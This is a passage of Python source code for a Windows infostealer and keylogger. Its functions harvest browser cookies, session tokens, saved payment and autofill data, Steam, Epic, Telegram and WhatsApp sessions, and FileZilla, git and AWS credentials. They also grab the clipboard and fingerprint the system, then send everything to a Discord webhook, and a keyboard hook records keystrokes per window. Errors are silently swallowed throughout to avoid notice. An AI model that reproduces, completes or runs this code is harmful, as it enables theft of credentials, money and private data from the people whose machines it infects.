                    date = (datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds=visit_date)).strftime("%Y-%m-%d %H:%M:%S")
            except:
                pass
            results.append(("Firefox", os.path.basename(profile_path), date, str(visit_count or 0), (title or "")[:200], (url or "")[:500]))
        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass
    return results
def extract_downloads(user_data_path, browser, profile="Default"):
    results = []
    history_db = os.path.join(user_data_path, profile, "History")
    if not os.path.exists(history_db):
        return results
    temp_db = copy_to_temp(history_db)
    if not temp_db:
        return results
    try:
        conn = sqlite3.connect(temp_db)
        for url, filename, received, total in conn.execute(
                "SELECT url, target_path, received_bytes, total_bytes FROM downloads ORDER BY start_time DESC"):
            results.append((browser, profile, url, filename, f"{received}/{total}"))
        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass
    return results
def extract_bookmarks(user_data_path, browser, profile="Default"):
    results = []
    bookmarks_file = os.path.join(user_data_path, profile, "Bookmarks")
    if not os.path.exists(bookmarks_file):
        return results
    try:
        with open(bookmarks_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        def parse_bookmarks(node, path=""):
            if isinstance(node, dict):
                if node.get("type") == "url" and node.get("url"):
                    results.append((browser, profile, path + node.get("name", "Untitled"), node.get("url")))
                if "children" in node:
                    for child in node["children"]:
                        if node.get("name"):
                            parse_bookmarks(child, path + node.get("name", "") + "/")
                        else:
                            parse_bookmarks(child, path)
        if "roots" in data:
            for root_name, root in data["roots"].items():
                parse_bookmarks(root)
    except:
        pass
    return results
def extract_extensions(user_data_path, browser, profile="Default"):
    results = []
    extensions_path = os.path.join(user_data_path, profile, "Extensions")
    if not os.path.exists(extensions_path):
        return results
    try:
        for ext_id in os.listdir(extensions_path):
            ext_dir = os.path.join(extensions_path, ext_id)
            for version in os.listdir(ext_dir):
                manifest = os.path.join(ext_dir, version, "manifest.json")
                if os.path.exists(manifest):
                    try:
                        with open(manifest, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                        name = data.get("name", "Unknown")
                        version_str = data.get("version", "Unknown")
                        description = data.get("description", "")
                        results.append((browser, profile, name, version_str, ext_id, description))
                    except:
                        pass
                    break
    except:
        pass
    return results
def extract_cookies(user_data_path, browser, profile="Default"):
    results = []
    cookie_paths = [
        os.path.join(user_data_path, profile, "Network", "Cookies"),
        os.path.join(user_data_path, profile, "Cookies")
    ]
    for cookie_db in cookie_paths:
        if not os.path.exists(cookie_db):
            continue
        temp_db = copy_to_temp(cookie_db)
        if not temp_db:
            continue
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.execute("PRAGMA table_info(cookies)")
            columns = [row[1] for row in cursor.fetchall()]
            if 'encrypted_value' in columns:
                cursor = conn.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE encrypted_value IS NOT NULL")
                for host_key, name, encrypted_value in cursor.fetchall():
                    try:
                        if isinstance(host_key, bytes):
                            host_key = host_key.decode('utf-8', errors='ignore')
                        if isinstance(name, bytes):
                            name = name.decode('utf-8', errors='ignore')
                        if encrypted_value:
                            encrypted_b64 = base64.b64encode(encrypted_value).decode('ascii')
                            results.append((browser, profile, host_key, name, encrypted_b64))
                    except:
                        pass
                conn.close()
                os.remove(temp_db)
                return results
            if 'value' in columns:
                cursor = conn.execute("SELECT host_key, name, value FROM cookies WHERE value != '' AND value IS NOT NULL")
                for host_key, name, value in cursor.fetchall():
                    try:
                        if isinstance(host_key, bytes):
                            host_key = host_key.decode('utf-8', errors='ignore')
                        if isinstance(name, bytes):
                            name = name.decode('utf-8', errors='ignore')
                        if isinstance(value, bytes):
                            value = value.decode('utf-8', errors='ignore')
                        if value and value.strip():
                            results.append((browser, profile, host_key, name, value))
                    except:
                        pass
                conn.close()
                os.remove(temp_db)
                return results
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(temp_db)
            except:
                pass
            break
    return results
def extract_session_cookies(user_data_path, browser, profile="Default"):
    results = []
    cookie_paths = [
        os.path.join(user_data_path, profile, "Network", "Cookies"),
        os.path.join(user_data_path, profile, "Cookies")
    ]
    for cookie_db in cookie_paths:
        if not os.path.exists(cookie_db):
            continue
        temp_db = copy_to_temp(cookie_db)
        if not temp_db:
            continue
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.execute("PRAGMA table_info(cookies)")
            columns = [row[1] for row in cursor.fetchall()]
            if 'has_expires' in columns and 'is_persistent' in columns:
                cursor = conn.execute("SELECT host_key, name, value, encrypted_value FROM cookies WHERE has_expires=0 OR is_persistent=0")
                for host_key, name, value, encrypted_value in cursor.fetchall():
                    try:
                        if isinstance(host_key, bytes):
                            host_key = host_key.decode('utf-8', errors='ignore')
                        if isinstance(name, bytes):
                            name = name.decode('utf-8', errors='ignore')
                        if value and isinstance(value, bytes):
                            value = value.decode('utf-8', errors='ignore')
                        if encrypted_value:
                            encrypted_b64 = base64.b64encode(encrypted_value).decode('ascii')
                            results.append((browser, profile, host_key, name, encrypted_b64))
                        else:
                            if value and value.strip():
                                results.append((browser, profile, host_key, name, value))
                    except:
                        pass
                conn.close()
                os.remove(temp_db)
                return results
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(temp_db)
            except:
                pass
            break
    return results
def extract_local_storage(user_data_path, browser, profile="Default"):
    results = []
    storage_path = os.path.join(user_data_path, profile, "Local Storage", "leveldb")
    if not os.path.exists(storage_path):
        return results
    try:
        for filename in os.listdir(storage_path):
            if filename.endswith(".log") or filename.endswith(".ldb"):
                try:
                    with open(os.path.join(storage_path, filename), 'r', errors='ignore') as f:
                        data = f.read()
                    for match in re.finditer(r'https?://[^\s"]+', data):
                        if match.group() not in results:
                            results.append(match.group())
                except:
                    pass
    except:
        pass
    return results[:50]
def extract_firefox_cookies(profile_path):
    results = []
    cookie_db = os.path.join(profile_path, "cookies.sqlite")
    if not os.path.exists(cookie_db):
        return results
    temp_db = copy_to_temp(cookie_db)
    if not temp_db:
        return results
    try:
        conn = sqlite3.connect(temp_db)
        for host, name, value in conn.execute("SELECT host, name, value FROM moz_cookies"):
            if value and str(value).strip():
                results.append(("Firefox", os.path.basename(profile_path), str(host), str(name), str(value)))
        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass
    return results
def extract_payment_methods(user_data_path, browser, profile="Default"):
    results = []
    web_db = os.path.join(user_data_path, profile, "Web Data")
    if not os.path.exists(web_db):
        return results
    temp_db = copy_to_temp(web_db)
    if not temp_db:
        return results
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='payment_methods'")
        if not cursor.fetchone():
            conn.close()
            os.remove(temp_db)
            return results
        for name, type_, display_name in conn.execute(
                "SELECT name_on_card, type, display_name FROM payment_methods"):
            if name or type_ or display_name:
                results.append((browser, profile, name or "", type_ or "", display_name or ""))
        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass
    return results
def extract_form_data(user_data_path, browser, profile="Default"):
    results = []
    web_db = os.path.join(user_data_path, profile, "Web Data")
    if not os.path.exists(web_db):
        return results
    temp_db = copy_to_temp(web_db)
    if not temp_db:
        return results
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.execute("PRAGMA table_info(autofill)")
        columns = [row[1] for row in cursor.fetchall()]
        if 'name' in columns and 'value' in columns:
            for name, value in conn.execute("SELECT name, value FROM autofill"):
                if name and value:
                    results.append((browser, profile, name, value))
        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass
    return results
def extract_browser_keywords(user_data_path, browser, profile="Default"):
    results = []
    web_db = os.path.join(user_data_path, profile, "Web Data")
    if not os.path.exists(web_db):
        return results
    temp_db = copy_to_temp(web_db)
    if not temp_db:
        return results
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.execute("PRAGMA table_info(keywords)")
        columns = [row[1] for row in cursor.fetchall()]
        if 'keyword' in columns and 'url' in columns:
            for keyword, url in conn.execute("SELECT keyword, url FROM keywords"):
                if keyword and url:
                    results.append((browser, profile, keyword, url))
        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass
    return results
def extract_browser_shortcuts(user_data_path, browser, profile="Default"):
    results = []
    shortcuts_file = os.path.join(user_data_path, profile, "Top Sites")
    if os.path.exists(shortcuts_file):
        try:
            with open(shortcuts_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            for item in data.get("topsites", []):
                url = item.get("url", "")
                title = item.get("title", "")
                if url:
                    results.append((browser, profile, title, url))
        except:
            pass
    return results
def extract_browser_cache(user_data_path, browser, profile="Default"):
    results = []
    cache_path = os.path.join(user_data_path, profile, "Cache")
    if not os.path.exists(cache_path):
        cache_path = os.path.join(user_data_path, profile, "Code Cache")
    if not os.path.exists(cache_path):
        return results
    try:
        count = 0
        for root, dirs, files in os.walk(cache_path):
            for file in files:
                filepath = os.path.join(root, file)
                try:
                    size = os.path.getsize(filepath)
                    if size > 0:
                        results.append((browser, profile, file, f"{size} bytes"))
                        count += 1
                    if count > 100:
                        break
                except:
                    pass
            if count > 100:
                break
    except:
        pass
    return results
def extract_websql_databases(user_data_path, browser, profile="Default"):
    results = []
    websql_path = os.path.join(user_data_path, profile, "databases")
    if not os.path.exists(websql_path):
        return results
    try:
        for root, dirs, files in os.walk(websql_path):
            for file in files:
                if file.endswith(".db") or file.endswith(".sqlite"):
                    db_path = os.path.join(root, file)
                    try:
                        db_size = os.path.getsize(db_path)
                        if db_size > 0:
                            results.append((browser, profile, file, f"{db_size} bytes"))
                    except:
                        pass
    except:
        pass
    return results
def extract_autofill_profiles(user_data_path, browser, profile="Default"):
    results = []
    web_db = os.path.join(user_data_path, profile, "Web Data")
    if not os.path.exists(web_db):
        return results
    temp_db = copy_to_temp(web_db)
    if not temp_db:
        return results
    try:
        conn = sqlite3.connect(temp_db)
        try:
            cursor = conn.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='autofill_profiles'")
            if cursor.fetchone():
                for row in conn.execute(
                        "SELECT full_name, company, street_address, city, state, zipcode, country FROM autofill_profiles"):
                    if row[0] or row[1] or row[2]:
                        results.append({
                            'type': 'address',
                            'browser': browser,
                            'profile': profile,
                            'full_name': row[0] or '',
                            'company': row[1] or '',
                            'street': row[2] or '',
                            'city': row[3] or '',
                            'state': row[4] or '',
                            'zip': row[5] or '',
                            'country': row[6] or ''
                        })
        except:
            pass
        try:
            cursor = conn.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='autofill'")
            if cursor.fetchone():
                for name, value in conn.execute(
                        "SELECT name, value FROM autofill WHERE (name LIKE '%phone%' OR name LIKE '%tel%' OR name LIKE '%mobile%') AND value != '' AND value IS NOT NULL"):
                    if value and value.strip():
                        results.append({
                            'type': 'phone',
                            'browser': browser,
                            'profile': profile,
                            'field': name,
                            'value': value
                        })
        except:
            pass
        try:
            cursor = conn.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='autofill'")
            if cursor.fetchone():
                for name, value in conn.execute(
                        "SELECT name, value FROM autofill WHERE name LIKE '%email%' AND value LIKE '%@%' AND value != '' AND value IS NOT NULL"):
                    if value and '@' in value:
                        results.append({
                            'type': 'email',
                            'browser': browser,
                            'profile': profile,
                            'field': name,
                            'value': value
                        })
        except:
            pass
        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass
    return results
# ---------- Other grabber functions ----------
def get_internal_ip_and_mac():
    results = {}
    try:
        hostname = socket.gethostname()
        results['hostname'] = hostname
        results['internal_ips'] = []
        results['mac_addresses'] = []
        try:
            output = subprocess.check_output("ipconfig", shell=True, text=True, errors='ignore')
            for line in output.splitlines():
                line = line.strip()
                if "IPv4" in line:
                    ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if ip_match:
                        ip = ip_match.group(1)
                        if ip != '127.0.0.1' and ip not in results['internal_ips']:
                            results['internal_ips'].append(ip)
        except:
            pass
        try:
            output = subprocess.check_output("getmac /v", shell=True, text=True, errors='ignore')
            for line in output.splitlines():
                mac_match = re.search(r'([0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2})', line)
                if mac_match:
                    mac = mac_match.group(1).replace('-', ':')
                    if mac != '00:00:00:00:00:00' and mac not in results['mac_addresses']:
                        results['mac_addresses'].append(mac)
        except:
            pass
        results['default_gateway'] = 'Unknown'
    except:
        results['internal_ips'] = ['Unavailable']
        results['mac_addresses'] = ['Unavailable']
    return results
def get_public_ip_and_location():
    results = {}
    try:
        with urllib.request.urlopen("http://ip-api.com/json/", timeout=8) as response:
            data = json.loads(response.read().decode())
        results['public_ip'] = data.get('query', 'Unknown')
        results['country'] = data.get('country', 'Unknown')
        results['region'] = data.get('regionName', 'Unknown')
        results['city'] = data.get('city', 'Unknown')
        results['zip'] = data.get('zip', 'Unknown')
        results['lat'] = data.get('lat', 0.0)
        results['lon'] = data.get('lon', 0.0)
        results['isp'] = data.get('isp', 'Unknown')
        results['org'] = data.get('org', 'Unknown')
        results['timezone'] = data.get('timezone', 'Unknown')
    except:
        results['public_ip'] = 'Unavailable'
        results['lat'] = 0.0
        results['lon'] = 0.0
    return results
def extract_steam_tokens():
    results = []
    for steam_path in STEAM_PATHS:
        if os.path.exists(steam_path):
            try:
                with open(steam_path, 'r', encoding='utf-8') as f:
                    data = f.read()
                for match in re.finditer(r'"AccountName"\s*"([^"]+)"', data):
                    results.append(("AccountName", match.group(1)))
                for match in re.finditer(r'"SteamID"\s*"([^"]+)"', data):
                    results.append(("SteamID", match.group(1)))
            except:
                pass
    return results
def extract_epic_tokens():
    results = []
    for epic_path in EPIC_PATHS:
        if os.path.exists(epic_path):
            try:
                with open(epic_path, 'r', encoding='utf-8') as f:
                    data = f.read()
                for match in re.finditer(r'[a-f0-9]{32}', data.lower()):
                    results.append(("EpicToken", match.group()))
            except:
                pass
    return results
def extract_telegram_sessions():
    results = []
    for tg_path in TELEGRAM_PATHS:
        if os.path.exists(tg_path):
            try:
                for root, dirs, files in os.walk(tg_path):
                    for file in files:
                        if file.endswith(".s") or file.endswith(".session") or file.endswith(".tdata"):
                            results.append(("TelegramSession", os.path.join(root, file)))
            except:
                pass
    return results
def extract_whatsapp_sessions():
    results = []
    for wa_path in WHATSAPP_PATHS:
        if os.path.exists(wa_path):
            try:
                for root, dirs, files in os.walk(wa_path):
                    for file in files:
                        if "session" in file.lower() or "key" in file.lower() or ".db" in file:
                            results.append(("WhatsAppSession", os.path.join(root, file)))
            except:
                pass
    return results
def extract_filezilla_credentials():
    results = []
    fz_paths = [
        os.path.join(os.getenv("APPDATA"), "FileZilla", "recentservers.xml"),
        os.path.join(os.getenv("APPDATA"), "FileZilla", "sitemanager.xml")
    ]
    for fz_path in fz_paths:
        if os.path.exists(fz_path):
            try:
                with open(fz_path, 'r', errors='ignore') as f:
                    data = f.read()
                for match in re.finditer(r'<Host>([^<]+)</Host>', data):
                    results.append(("FileZillaHost", match.group(1)))
                for match in re.finditer(r'<User>([^<]+)</User>', data):
                    results.append(("FileZillaUser", match.group(1)))
                for match in re.finditer(r'<Pass>([^<]+)</Pass>', data):
                    results.append(("FileZillaPass", match.group(1)))
            except:
                pass
    return results
def extract_git_credentials():
    results = []
    git_paths = [
        os.path.join(os.getenv("USERPROFILE"), ".git-credentials"),
        os.path.join(os.getenv("USERPROFILE"), ".config", "git", "credentials")
    ]
    for git_path in git_paths:
        if os.path.exists(git_path):
            try:
                with open(git_path, 'r', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and "://" in line:
                            results.append(("GitCredential", line))
            except:
                pass
    return results
def extract_aws_credentials():
    results = []
    aws_path = os.path.join(os.getenv("USERPROFILE"), ".aws", "credentials")
    if os.path.exists(aws_path):
        try:
            with open(aws_path, 'r', errors='ignore') as f:
                data = f.read()
            for match in re.finditer(r'(aws_access_key_id|aws_secret_access_key)\s*=\s*([^\s]+)', data):
                results.append(("AWSCredential", f"{match.group(1)}: {match.group(2)}"))
        except:
            pass
    return results
def extract_ssh_keys():
    results = []
    ssh_path = os.path.join(os.getenv("USERPROFILE"), ".ssh")
    if os.path.exists(ssh_path):
        try:
            for file in os.listdir(ssh_path):
                if file.endswith(".pub"):
                    results.append(("SSHPublicKey", file))
                elif file.endswith("_rsa") or file.endswith("_ed25519") or file == "id_rsa" or file == "id_ed25519":
                    results.append(("SSHPrivateKey", file))
        except:
            pass
    return results
def get_system_info():
    info = {}
    try:
        info['OS'] = platform.system() + " " + platform.release()
        info['Version'] = platform.version()
        info['Machine'] = platform.machine()
        info['Processor'] = platform.processor()
        info['CPU Cores'] = str(psutil.cpu_count())
        info['RAM'] = f"{psutil.virtual_memory().total / (1024 ** 3):.1f} GB"
        info['RAM Used'] = f"{psutil.virtual_memory().used / (1024 ** 3):.1f} GB"
        info['Disk'] = f"{psutil.disk_usage('/').total / (1024 ** 3):.1f} GB"
        info['Disk Free'] = f"{psutil.disk_usage('/').free / (1024 ** 3):.1f} GB"
        info['Hostname'] = platform.node()
        info['Username'] = os.getenv("USERNAME")
        info['Domain'] = os.getenv("USERDOMAIN")
        info['Uptime'] = get_system_uptime()
        info['Wallpaper'] = get_desktop_wallpaper()
        info['Windows Product Key'] = get_windows_product_key()
    except:
        pass
    return info
def get_system_uptime():
    try:
        uptime_seconds = int(time.time() - psutil.boot_time())
        days = uptime_seconds // 86400
        hours = (uptime_seconds % 86400) // 3600
        minutes = (uptime_seconds % 3600) // 60
        return f"{days}d {hours}h {minutes}m"
    except:
        return "Unknown"
def get_desktop_wallpaper():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop")
        wallpaper = winreg.QueryValueEx(key, "Wallpaper")[0]
        winreg.CloseKey(key)
        if wallpaper and os.path.exists(wallpaper):
            return wallpaper
    except:
        pass
    return "Unknown"
def get_windows_product_key():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        product_id = winreg.QueryValueEx(key, "ProductId")[0]
        winreg.CloseKey(key)
        return product_id
    except:
        return "Not available"
def get_user_accounts():
    results = []
    try:
        users = win32net.NetUserEnum(None, 0)
        for user in users[0]:
            results.append(("LocalUser", user["name"]))
    except:
        pass
    try:
        sid = win32security.LookupAccountName(None, os.getenv("USERNAME"))[0]
        sid_str = win32security.ConvertSidToStringSid(sid)
        results.append(("CurrentUserSID", sid_str))
    except:
        pass
    return results
def get_startup_programs():
    results = []
    startup_paths = [
        os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
        os.path.join(os.getenv("PROGRAMDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    ]
    for path in startup_paths[:2]:
        if os.path.exists(path):
            for item in os.listdir(path):
                if item.endswith(".lnk"):
                    results.append(("StartupFolder", item))
    for reg_path in startup_paths[2:]:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
            for i in range(winreg.QueryInfoKey(key)[1]):
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    results.append(("Registry", f"{name}: {value}"))
                except:
                    pass
            winreg.CloseKey(key)
        except:
            pass
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
            for i in range(winreg.QueryInfoKey(key)[1]):
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    results.append(("Registry", f"{name}: {value}"))
                except:
                    pass
            winreg.CloseKey(key)
        except:
            pass
    return results
def get_windows_services():
    results = []
    try:
        output = subprocess.check_output("sc query state= all", shell=True, text=True, errors="ignore")
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("SERVICE_NAME:"):
                service_name = line.replace("SERVICE_NAME:", "").strip()
                results.append(("Service", service_name))
    except:
        pass
    return results[:50]
def get_env_variables():
    results = []
    try:
        for key, value in os.environ.items():
            if any(x in key.lower() for x in ["path", "windir", "systemroot", "programdata"]):
                continue
            results.append((key, value[:100] if len(value) > 100 else value))
    except:
        pass
    return results
def get_hosts_file():
    results = []
    hosts_path = os.path.join(os.getenv("SystemRoot"), "System32", "drivers", "etc", "hosts")
    if not os.path.exists(hosts_path):
        return results
    try:
        with open(hosts_path, 'r', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    parts = line.split()
                    if len(parts) >= 2:
                        results.append((parts[0], parts[1]))
    except:
        pass
    return results
def get_active_connections():
    results = []
    try:
        connections = psutil.net_connections(kind='inet')
        for conn in connections[:30]:
            try:
                local = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
                remote = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
                status = conn.status if conn.status else "UNKNOWN"
                pid = conn.pid if conn.pid else 0
                proc_name = ""
                if pid:
                    try:
                        proc_name = psutil.Process(pid).name()
                    except:
                        pass
                results.append((local, remote, status, pid, proc_name))
            except:
                pass
    except:
        pass
    return results
def get_dns_cache():
    results = []
    try:
        output = subprocess.check_output("ipconfig /displaydns", shell=True, text=True, errors="ignore")
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("    Record Name"):
                hostname = line.replace("    Record Name", "").strip().rstrip(".")
                if hostname:
                    results.append(hostname)
    except:
        pass
    return results[:50]
def get_proxy_settings():
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings")
        proxy_enabled = winreg.QueryValueEx(key, "ProxyEnable")[0]
        proxy_server = winreg.QueryValueEx(key, "ProxyServer")[0] if "ProxyServer" in [
            winreg.EnumValue(key, i)[0] for i in range(winreg.QueryInfoKey(key)[1])] else ""
        winreg.CloseKey(key)
        results.append(("ProxyEnabled", str(proxy_enabled)))
        if proxy_server:
            results.append(("ProxyServer", proxy_server))
    except:
        pass
    return results
def get_vpn_profiles():
    results = []
    try:
        output = subprocess.check_output("rasdial", shell=True, text=True, errors="ignore")
        for line in output.splitlines():
            if "connected" in line.lower() or "vpn" in line.lower():
                results.append(line.strip())
    except:
        pass
    for path in VPN_PATHS:
        if os.path.exists(path):
            results.append(f"VPN Config Found: {path}")
    return results
def get_browser_fingerprint():
    results = []
    try:
        user32 = ctypes.windll.user32
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        results.append(f"Screen: {width}x{height}")
        results.append(f"OS: {platform.system()} {platform.release()}")
        results.append(f"Machine: {platform.machine()}")
        try:
            if win32com.client:
                from win32 import win32ui
                dc = win32ui.CreateDC()
                font_list = []
                for font_name in ["Arial", "Calibri", "Times New Roman", "Verdana", "Segoe UI", "Tahoma"]:
                    try:
                        dc.SelectObject(win32ui.CreateFont({"name": font_name}))
                        font_list.append(font_name)
                    except:
                        pass
                results.append(f"Fonts: {', '.join(font_list[:5])}")
        except:
            pass
    except:
        pass
    return results
def get_clipboard_content():
    try:
        win32clipboard.OpenClipboard()
        if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
            data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
            win32clipboard.CloseClipboard()
            return data.decode('utf-8', errors='ignore') if data else ""
        win32clipboard.CloseClipboard()
    except:
        pass
    return ""
def get_recent_files():
    results = []
    try:
        recent_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Recent")
        if os.path.exists(recent_path):
            for filename in os.listdir(recent_path)[:50]:
                if filename.endswith(".lnk"):
                    try:
                        if win32com.client:
                            shell = win32com.client.Dispatch("WScript.Shell")
                            shortcut = shell.CreateShortCut(os.path.join(recent_path, filename))
                            results.append((filename.replace(".lnk", ""), shortcut.TargetPath))
                    except:
                        results.append((filename.replace(".lnk", ""), "Could not resolve"))
    except:
        pass
    return results
def get_running_processes():
    results = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'exe']):
            try:
                results.append(
                    (proc.info['pid'], proc.info['name'], f"{proc.info['cpu_percent']:.1f}%",
                     f"{proc.info['memory_percent']:.1f}%", proc.info['exe'] or ""))
            except:
                pass
    except:
        pass
    return results[:50]
def get_installed_software():
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        for i in range(winreg.QueryInfoKey(key)[0]):
            try:
                subkey = winreg.EnumKey(key, i)
                with winreg.OpenKey(key, subkey) as sk:
                    try:
                        name = winreg.QueryValueEx(sk, "DisplayName")[0]
                        version = winreg.QueryValueEx(sk, "DisplayVersion")[0] if "DisplayVersion" in [
                            winreg.EnumValue(sk, j)[0] for j in range(winreg.QueryInfoKey(sk)[1])] else "Unknown"
                        if name:
                            results.append((name, version))
                    except:
                        pass
            except:
                pass
        winreg.CloseKey(key)
    except:
        pass
    return results
def get_network_info():
    results = []
    try:
        for adapter, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == 2:
                    results.append((adapter, addr.address, addr.netmask))
    except:
        pass
    return results
# ---------- Webhook Sender for Grabber ----------
def send_to_discord(data, filename=None):
    try:
        boundary = '----WebKitFormBoundary' + ''.join(random.choices('abcdef0123456789', k=16))
        content_message = f'Grabber Data from {os.getenv("USERNAME", "unknown")}'
        body_parts = []
        body_parts.append(f'--{boundary}\r\n'.encode('utf-8'))
        body_parts.append('Content-Disposition: form-data; name="content"\r\n'.encode('utf-8'))
        body_parts.append('\r\n'.encode('utf-8'))
        body_parts.append(f'{content_message}\r\n'.encode('utf-8'))
        if filename and data:
            body_parts.append(f'--{boundary}\r\n'.encode('utf-8'))
            body_parts.append(f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'.encode('utf-8'))
            body_parts.append('Content-Type: application/zip\r\n'.encode('utf-8'))
            body_parts.append('\r\n'.encode('utf-8'))
            body_parts.append(data)
            body_parts.append(b'\r\n')
            body_parts.append(f'--{boundary}--\r\n'.encode('utf-8'))
        body = b''.join(body_parts)
        headers = {
            'Content-Type': f'multipart/form-data; boundary={boundary}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        req = urllib.request.Request(WEBHOOK_URL, data=body, headers=headers, method='POST')
        with urllib.request.urlopen(req, timeout=30) as response:
            if response.getcode() in [200, 204]:
                return True
    except:
        pass
    return False
def send_text_to_discord(text):
    try:
        payload = json.dumps({"content": text}).encode('utf-8')
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=payload,
            headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
            method='POST'
        )
        with urllib.request.urlopen(req, timeout=10) as response:
            if response.getcode() in [200, 204]:
                return True
    except:
        pass
    return False
# ---------- Keylogger ----------
KEYLOGGER_BUFFER = []
KEYLOGGER_BUFFER_LOCK = threading.Lock()
KEYLOGGER_LAST_SEND = time.time()
def get_key_name(vk_code):
    key_map = {
        8: '[BACKSPACE]', 9: '[TAB]', 13: '[ENTER]\n', 16: '[SHIFT]', 17: '[CTRL]',
        18: '[ALT]', 19: '[PAUSE]', 20: '[CAPS]', 27: '[ESC]', 32: ' ',
        33: '[PGUP]', 34: '[PGDN]', 35: '[END]', 36: '[HOME]',
        37: '[LEFT]', 38: '[UP]', 39: '[RIGHT]', 40: '[DOWN]',
        44: '[PRTSC]', 45: '[INS]', 46: '[DEL]',
        91: '[WIN]', 92: '[WIN]', 160: '[LSHIFT]', 161: '[RSHIFT]',
        162: '[LCTRL]', 163: '[RCTRL]', 164: '[LALT]', 165: '[RALT]',
    }
    if vk_code in key_map:
        return key_map[vk_code]
    if 48 <= vk_code <= 57:
        return chr(vk_code)
    if 65 <= vk_code <= 90:
        return chr(vk_code)
    if 96 <= vk_code <= 105:
        return f'[NUM{vk_code-96}]'
    if 112 <= vk_code <= 123:
        return f'[F{vk_code-111}]'
    if 186 <= vk_code <= 192:
        special = {186: ';', 187: '=', 188: ',', 189: '-', 190: '.', 191: '/', 192: '`'}
        return special.get(vk_code, f'[{vk_code}]')
    if 219 <= vk_code <= 222:
        special = {219: '[', 220: '\\', 221: ']', 222: "'"}
        return special.get(vk_code, f'[{vk_code}]')
    return f'[{vk_code}]'
def keylogger_callback(nCode, wParam, lParam):
    global KEYLOGGER_BUFFER
    try:
        if nCode >= 0:
            if wParam in (256, 260):
                kb = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_long * 5)).contents
                vk_code = kb[0]
                active_window = ctypes.create_unicode_buffer(256)
                ctypes.windll.user32.GetWindowTextW(
                    ctypes.windll.user32.GetForegroundWindow(),
                    active_window, 256
                )
                window_title = active_window.value
                key_name = get_key_name(vk_code)
                timestamp = datetime.datetime.now().strftime("%H:%M:%S")
                with KEYLOGGER_BUFFER_LOCK:
                    if not KEYLOGGER_BUFFER or KEYLOGGER_BUFFER[-1].get('window') != window_title:
                        KEYLOGGER_BUFFER.append({
                            'window': window_title,
                            'time': timestamp,
                            'keys': key_name
                        })
                    else:
                        KEYLOGGER_BUFFER[-1]['keys'] += key_name
    except:
        pass
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
def flush_keylogger_buffer():
    global KEYLOGGER_BUFFER, KEYLOGGER_LAST_SEND
    with KEYLOGGER_BUFFER_LOCK:
        if not KEYLOGGER_BUFFER:
            return
        text = "KEYLOGGER DATA\n" + "=" * 70 + "\n"
